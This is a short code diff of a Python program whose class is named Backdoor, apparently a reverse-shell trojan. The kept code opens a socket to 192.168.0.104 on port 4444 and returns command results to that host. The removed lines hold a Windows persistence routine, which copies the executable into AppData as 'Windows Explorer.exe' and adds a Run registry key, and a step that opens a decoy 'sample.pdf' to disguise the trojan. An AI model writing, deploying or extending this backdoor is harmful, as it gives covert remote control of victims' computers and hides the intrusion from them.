@@ -8,11 +8,6 @@ class Backdoor:
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
 
-    def become_persistent(self):
-        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
-        if not os.path.exists(evil_file_location):
-            shutil.copyfile(sys.executable, evil_file_location)
-            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
@@ -66,8 +61,6 @@ class Backdoor:
             self.reliable_send(command_result)
 
 
-file_name = sys._MEIPASS + "\sample.pdf"
-subprocess.Popen(file_name, shell=True)
 
 try:
     my_backdoor = Backdoor("192.168.0.104", 4444)
